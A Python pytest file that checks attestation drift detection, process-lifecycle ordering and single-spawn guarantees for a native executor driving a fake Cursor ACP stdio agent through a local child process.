def test_changed_acp_class_schema_or_policy_is_refused(tmp_path: Path):
    _, discovery, attestation = _acp_attestation(tmp_path)
    expectations = (
        ({"attestation_class": ATTESTATION_CLASS_WRAPPER_CHAIN}, "acp_attestation_class"),
        ({"schema_version": "admissible_cursor_acp_stdio_attestation_v3"}, "acp_attestation_class"),
        ({"backend_protocol_version": "cursor-agent-acp-stdio-v2"}, "acp_attestation_class"),
        ({"cwd_policy": "anywhere"}, "acp_prompt_binding_policy"),
        ({"prompt_fingerprint_binding_policy": "unbound"}, "acp_prompt_binding_policy"),
        ({"non_claims": ()}, "acp_prompt_binding_policy"),
        ({"claims": {"acp_protocol_conformance_established": True}}, "acp_prompt_binding_policy"),
        ({"environment_derivation_policy": "inherit"}, "acp_derived_environment"),
        ({"derived_environment": {"SystemDrive": "Z:", "ProgramData": r"Z:\ProgramData",
                                  "ALLUSERSPROFILE": r"Z:\ProgramData"}}, "acp_derived_environment"),
        ({"attestation_fingerprint": "0" * 64}, "acp_attestation_fingerprint"),
    )
    for changes, expected in expectations:
        drift = _observe_backend_drift(
            _tampered(attestation, **changes), post_run_wrapper_chain_attestation=_post_run_chain(discovery),
        )
        assert f"{expected}:CONTENT_DRIFT" in drift.blocking_diagnostics
        assert not drift.clean and not drift.post_run_eligible


def test_changed_derived_windows_environment_or_derivation_authority_is_drift(tmp_path: Path):
    """G.14: the deterministic shell-folder authority is a drift dimension.

    A changed value and a changed derivation policy are both refused, and the
    clean attestation re-derives to exactly the same three names live.
    """

    _, discovery, attestation = _acp_attestation(tmp_path)
    if os.name == "nt":
        assert set(attestation.derived_environment) == {
            "SystemDrive", "ProgramData", "ALLUSERSPROFILE",
        }
    clean = _observe_backend_drift(attestation, post_run_wrapper_chain_attestation=_post_run_chain(discovery))
    assert "acp_derived_environment:NO_DRIFT" in clean.diagnostics and clean.clean

    mutations = (
        {"derived_environment": {**dict(attestation.derived_environment), "ProgramData": r"C:\Elsewhere"}},
        {"derived_environment": {}},
        {"environment_derivation_policy": "inherited-from-the-parent-environment"},
    )
    for changes in mutations:
        drift = _observe_backend_drift(
            _tampered(attestation, **changes),
            post_run_wrapper_chain_attestation=_post_run_chain(discovery),
        )
        assert "acp_derived_environment:CONTENT_DRIFT" in drift.blocking_diagnostics
        assert not drift.clean and not drift.post_run_eligible


def test_unknown_attestation_class_is_refused_and_never_duck_typed(tmp_path: Path):
    _, _, attestation = _acp_attestation(tmp_path)

    @dataclass(frozen=True)
    class ForeignAttestation:
        """Carries exactly the duck-typed surface the observer used to rely on."""

        executable: NativeBackendFileAttestation
        launcher_prefix: tuple[NativeBackendFileAttestation, ...]
        provenance: object

    foreign = ForeignAttestation(attestation.executable, attestation.launcher_prefix, object())
    with pytest.raises(NativeEvidenceInvalid, match="drift-observation authority"):
        _observe_backend_drift(foreign)
    assert _wrapper_chain_command_authority(foreign) is None


# --- ARGV wrapper-chain behavior is byte-for-byte unchanged ------------------


def test_wrapper_chain_drift_diagnostics_remain_byte_identical(tmp_path: Path):
    root, discovery, chain = _wrapper_attestation(tmp_path)
    refreshed = _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
    drift = _observe_backend_drift(chain, post_run_wrapper_chain_attestation=refreshed)
    assert drift.diagnostics == (
        "pinned_executable:NO_DRIFT",
        "pinned_launcher_0:NO_DRIFT",
        "cmd_wrapper:NO_DRIFT",
        "powershell_wrapper:NO_DRIFT",
        "selected_package_manifest:NO_DRIFT",
        "selected_wrapper_copy_0:NO_DRIFT",
        "selected_wrapper_copy_1:NO_DRIFT",
        "command_resolution:NO_DRIFT",
        "version_inventory:NO_DRIFT",
        "selected_version:NO_DRIFT",
    )
    assert len(drift.wrappers) == 5 and drift.clean
    # The package-bin class keeps its own untouched branch.
    package_root = tmp_path / "package"; package_root.mkdir()
    package = _observe_backend_drift(_harness(package_root).attestation)
    assert (package.command_resolution, package.catalog, package.selected_version) == ("NOT_APPLICABLE",) * 3
    assert all(item.startswith("package_chain_") for item in package.diagnostics[2:])


# --- executor lifecycle on the ACP lane --------------------------------------


def test_acp_spawn_failure_reserves_the_attempt_but_publishes_no_process_started(tmp_path: Path):
    h, _ = _acp_harness(tmp_path, runner=FakeNativeProcessRunner(spawn_error=True))
    request, prompt = _request(h)
    h.store.create_request(request)
    with pytest.raises(NativeProcessStartError):
        h.executor.execute(
            request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
            allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
            artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE,
            required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store,
        )
    assert h.store.has_attempt_reserved(h.session_id, CANARY_GATE_ID, 0)
    assert not h.store.has_process_started(h.session_id, CANARY_GATE_ID, 0)
    assert not h.store.has_process_observation(h.session_id, CANARY_GATE_ID, 0)
    assert not h.store.has_execution_eligibility(h.session_id, CANARY_GATE_ID, 0)
    assert not h.store.has_result(h.session_id, CANARY_GATE_ID, 0)
    assert len(h.runner.invocations) == 1


def test_acp_drift_is_observed_before_the_attempt_is_reserved(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    """The V2 failure mode -- crashing after burning the attempt -- is structural now."""

    h, _ = _acp_harness(tmp_path)
    request, prompt = _request(h)
    h.store.create_request(request)
    seen: list[str] = []

    def refusing(attestation, **kwargs):
        seen.append("observed")
        raise NativeEvidenceInvalid("backend attestation class has no drift-observation authority")

    monkeypatch.setattr(native_executor, "_observe_backend_drift", refusing)
    with pytest.raises(NativeEvidenceInvalid, match="drift-observation authority"):
        h.executor.execute(
            request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
            allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
            artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE,
            required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store,
        )
    assert seen == ["observed"]
    assert not h.store.has_attempt_reserved(h.session_id, CANARY_GATE_ID, 0)
    assert not h.store.has_process_started(h.session_id, CANARY_GATE_ID, 0)
    assert h.runner.invocations == []


def test_acp_drift_failure_is_never_reported_as_provider_completion(tmp_path: Path):
    h, discovery = _acp_harness(tmp_path)
    moved = tmp_path / "moved"; moved.mkdir()
    h.runner.after_start = lambda: setattr(discovery, "path", _path_value(moved, discovery.root, "C:\\Windows"))
    outcome = h.coordinator.run(session_id=h.session_id)
    assert outcome.status is NativeCanaryStatus.PRECAPTURE_ELIGIBILITY_FAILED and not outcome.canary_success
    eligibility = h.store.load_execution_eligibility(h.session_id, CANARY_GATE_ID, 0)
    assert not eligibility.eligible and "post_run_backend_drift" in eligibility.ineligibility_reasons
    assert "command_resolution:IDENTITY_ONLY_DRIFT" in eligibility.backend_drift_diagnostics
    # The process observation stays durable; only the accepted result is withheld.
    observation = h.store.load_process_observation(h.session_id, CANARY_GATE_ID, 0)
    assert observation.process_completion_observed and not h.store.has_result(h.session_id, CANARY_GATE_ID, 0)
    assert (outcome.native_attempts_reserved, outcome.native_processes_started, outcome.provider_invocations) == (1, 1, 1)


# --- the real fake-ACP managed-process path ---------------------------------
#
# These drive a *real* child process through the real ``AcpStdioNativeProcessRunner``
# and ``ManagedProcess``: the attested ``node.exe`` is a copy of this interpreter
# and the attested ``index.js`` is the deterministic fake entry bundle, so the
# pinned ``<node.exe> <index.js> acp`` argv is spawned exactly as attested.  No
# Cursor agent and no model is ever contacted.

from admissible.delegated_gate.native_executor import AcpStdioNativeProcessRunner

_ACP_ENTRY_FIXTURE = Path(__file__).parent / "fixtures" / "admissible" / "fake_acp_cursor_entry.py"


def _acp_success_plan(tmp_path: Path) -> Path:
    """The mission's physical effects, from the same helper the ARGV lane uses."""

    scratch = tmp_path / "acp-plan"; scratch.mkdir()
    sample = build_canary_repository(scratch, repository_name="plan-sample").repository
    _materialize_success(sample)
    plan = {
        "files": {relative: (sample / relative).read_text(encoding="utf-8") for relative in sorted(EXPECTED_MATERIAL_PATHS)},
        "commit_message": REQUIRED_COMMIT_MESSAGE,
    }
    path = tmp_path / "acp-plan.json"; path.write_text(json.dumps(plan), encoding="utf-8")
    return path


def _acp_entry_installation(tmp_path: Path, plan: Path) -> Path:
    """A wrapper-chain installation whose attested entry really serves ACP."""

    root = _wrapper_chain_installation(tmp_path)
    entry = json.dumps(str(_ACP_ENTRY_FIXTURE)); plan_literal = json.dumps(str(plan))
    program = (
        "import runpy, sys\n"
        f"sys.argv = [{entry}, *sys.argv[1:], '--plan', {plan_literal}]\n"
        f"runpy.run_path({entry}, run_name='__main__')\n"
    )
    for version in sorted((root / "versions").iterdir()):
        (version / "index.js").write_text(program, encoding="utf-8", newline="\n")
    return root


@dataclass
class ObservingAcpRunner:
    """The real ACP runner, plus witnesses for the PROCESS_STARTED ordering."""

    store: AtomicNativeExecutionStore
    session_id: str
    invocations: list[NativeProcessInvocation] = field(default_factory=list)
    started_published_before_spawn: list[bool] = field(default_factory=list)
    started_published_at_callback: list[bool] = field(default_factory=list)
    observed_process_ids: list[int] = field(default_factory=list)

    def run(self, invocation: NativeProcessInvocation) -> NativeProcessOutcome:
        self.invocations.append(invocation)
        self.started_published_before_spawn.append(self.store.has_process_started(self.session_id, CANARY_GATE_ID, 0))
        publish = invocation.process_started

        def observed(proof: _NativeProcessCreationProof) -> None:
            self.observed_process_ids.append(proof.process_id)
            publish(proof)
            self.started_published_at_callback.append(self.store.has_process_started(self.session_id, CANARY_GATE_ID, 0))

        return AcpStdioNativeProcessRunner().run(replace(invocation, process_started=observed))


def _real_acp_harness(tmp_path: Path) -> tuple[Harness, ObservingAcpRunner]:
    source_parent = tmp_path / "source-parent"; source_parent.mkdir(); source = build_canary_repository(source_parent, repository_name="source").repository
    root = tmp_path / "run"; root.mkdir(); work = build_canary_repository(root).repository; evidence = root / "evidence"; evidence.mkdir()
    discovery = FakeWrapperChainDiscovery(_acp_entry_installation(tmp_path, _acp_success_plan(tmp_path)))
    attestor = _acp_attestor(discovery)
    attestation = attestor(_ACP_CONFIG)
    store = AtomicNativeExecutionStore(evidence / "native-execution"); session_store = AtomicDelegatedSessionStore(evidence / "delegated-state")
    session_id = "acp-managed-process-session"; session_store.create(create_canary_session(session_id=session_id))
    runner = ObservingAcpRunner(store, session_id)
    executor = NativeDelegatedExecutor(config=_ACP_CONFIG, process_runner=runner, clock=Clock(), local_attestor=attestor)
    coordinator = NativeCanaryCoordinator(session_store=session_store, execution_store=store, executor=executor, backend_attestation=attestation, source_repository=source, work_workspace=work, canary_parent=root, evidence_directory=evidence, timeout_seconds=240, stdout_byte_limit=1 << 20, stderr_byte_limit=1 << 18)
    return Harness(root, source, work, evidence, _ACP_CONFIG, attestation, runner, store, session_store, executor, coordinator, session_id), runner


def _real_acp_request(h: Harness) -> tuple[NativeExecutionRequest, str]:
    state = h.session_store.load(h.session_id)
    prompt = build_native_agent_prompt(mission=state.mission, gate_contract=state.current_gate, work_workspace=h.work)
    return NativeExecutionRequest.create(
        session_id=state.session_id, gate_id=state.current_gate.gate_id, execution_attempt_index=0,
        mission_fingerprint=state.mission.mission_fingerprint,
        gate_contract_fingerprint=state.current_gate.contract_fingerprint, work_workspace=h.work,
        evidence_store_root=h.store.directory, artifact_directory=h.store.artifact_directory,
        attestation=h.attestation, prompt=prompt, timeout_seconds=240,
        stdout_byte_limit=1 << 20, stderr_byte_limit=1 << 18,
    ), prompt


def test_real_acp_attestation_reaches_the_fake_acp_managed_process(tmp_path: Path):
    """The exact V2 traceback path, end to end, against a real child process."""

    h, runner = _real_acp_harness(tmp_path)
    request, prompt = _real_acp_request(h)
    h.store.create_request(request)
    issued = h.executor.execute(
        request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
        allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
        artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE,
        required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store,
    )
    result = h.store.write_result(issued)
    assert result.status is NativeExecutionStatus.PROCESS_SUCCEEDED and result.process_exit_code == 0
    assert result.commits_added == 1 and result.final_commit_message == REQUIRED_COMMIT_MESSAGE
    assert EXPECTED_MATERIAL_PATHS.issubset(set(result.changed_material_files))

    # Drift observation ran on the ACP class and reported no drift at all.
    eligibility = h.store.load_execution_eligibility(h.session_id, CANARY_GATE_ID, 0)
    assert eligibility.eligible and not eligibility.ineligibility_reasons
    acp_diagnostics = tuple(item for item in eligibility.backend_drift_diagnostics if item.startswith("acp_"))
    assert len(acp_diagnostics) == 7 and all(item.endswith(":NO_DRIFT") for item in acp_diagnostics)
    assert eligibility.catalog_validation == "NO_DRIFT" and eligibility.selected_version_validation == "NO_DRIFT"
    assert "command_resolution:NO_DRIFT" in eligibility.backend_drift_diagnostics

    # Exactly one real process, spawned on the exact attested ACP server argv.
    assert len(runner.invocations) == 1
    invocation = runner.invocations[0]
    assert invocation.argv == h.attestation.static_argv_template and invocation.argv[-1] == ACP_SUBCOMMAND
    assert invocation.prompt_transport == PROMPT_TRANSPORT_ACP_STDIO

    # PROCESS_STARTED is published only once a real OS PID exists.
    assert runner.started_published_before_spawn == [False]
    assert runner.started_published_at_callback == [True]
    started = h.store.load_process_started(h.session_id, CANARY_GATE_ID, 0)
    observation = h.store.load_process_observation(h.session_id, CANARY_GATE_ID, 0)
    assert runner.observed_process_ids == [started.process_id]
    assert started.process_id > 0 and started.process_id != os.getpid()
    assert observation.process["process_id"] == started.process_id
    assert observation.process["cleanup_observation"] == OBSERVATION_PROVEN_EMPTY
    assert observation.process["cleanup_confirmed"] and not observation.process["orphan_process_ids"]

    # The executor -- not the runner -- supplies the durable client-authority
    # sink, rooted in the evidence store's artifact directory, and binds the
    # attested launcher files as the only out-of-workspace paths a permitted
    # command may name.
    sink = invocation.acp_authority_evidence
    assert sink is not None
    assert sink.path.parent == h.store.artifact_directory
    assert sink.path.name == (
        f"{h.session_id}.{CANARY_GATE_ID}.attempt-0.native.acp-client-authority.jsonl"
    )
    assert invocation.acp_additional_authorized_paths == frozenset(
        {h.attestation.executable.canonical_path}
        | {item.canonical_path for item in h.attestation.launcher_prefix}
    )
    # The deterministic shell-folder authority reached the real child.
    if os.name == "nt":
        assert set(native_executor.WINDOWS_SHELL_FOLDER_NAMES).issubset(invocation.env)
        assert invocation.env["ALLUSERSPROFILE"] == invocation.env["ProgramData"]
        assert dict(h.attestation.derived_environment) == {
            name: invocation.env[name] for name in native_executor.WINDOWS_SHELL_FOLDER_NAMES
        }

    # The prompt never entered argv, the result, or any retained diagnostic.
    assert not any(prompt in member for member in invocation.argv)
    assert not any(prompt in member for member in result.argv)
    assert not any(prompt in item for item in eligibility.backend_drift_diagnostics)


def test_real_acp_execution_never_retries_or_spawns_a_second_process(tmp_path: Path):
    h, runner = _real_acp_harness(tmp_path)
    request, prompt = _real_acp_request(h)
    h.store.create_request(request)
    arguments = dict(
        request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
        allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
        artifact_directory=h.store.artifact_directory, required_commit_message=REQUIRED_COMMIT_MESSAGE,
        required_material_paths=EXPECTED_MATERIAL_PATHS, execution_store=h.store,
    )
    h.store.write_result(h.executor.execute(**arguments))
    with pytest.raises(NativeResultAlreadyExists):
        h.executor.execute(**arguments)
    assert len(runner.invocations) == 1 and len(runner.observed_process_ids) == 1
    assert not tuple(h.store.directory.glob("*.attempt-1.*"))


def test_an_unconditional_acp_drift_pass_is_killed(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    """Direct mutation witness: neutering the ACP layer must change the verdict."""

    _, discovery, attestation = _acp_attestation(tmp_path)
    tampered = _tampered(attestation, prompt_transport=PROMPT_TRANSPORT_ARGV)
    assert not _observe_backend_drift(tampered, post_run_wrapper_chain_attestation=_post_run_chain(discovery)).clean

    names = ("acp_attestation_class", "acp_prompt_transport", "acp_static_argv",
             "acp_wrapper_chain_binding", "acp_prompt_binding_policy", "acp_attestation_fingerprint")
    monkeypatch.setattr(
        native_executor, "_acp_transport_drift",
        lambda attestation: (("NO_DRIFT",) * len(names), tuple(f"{name}:NO_DRIFT" for name in names)),
    )
    mutant = _observe_backend_drift(tampered, post_run_wrapper_chain_attestation=_post_run_chain(discovery))
    assert mutant.clean and mutant.post_run_eligible
